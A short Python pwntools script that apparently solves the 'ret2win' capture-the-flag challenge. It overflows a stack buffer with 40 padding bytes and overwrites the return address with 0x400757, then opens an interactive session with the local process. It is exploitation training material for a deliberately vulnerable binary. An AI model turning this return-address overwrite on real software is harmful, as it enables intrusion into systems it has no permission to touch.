#!/usr/bin/env python3
from pwn import *

elf = ELF("./ret2win", checksec=True)

payload = flat(
    b'A'*40,
    p64(0x400757)
)
io = elf.process()
io.send(payload)
io.interactive()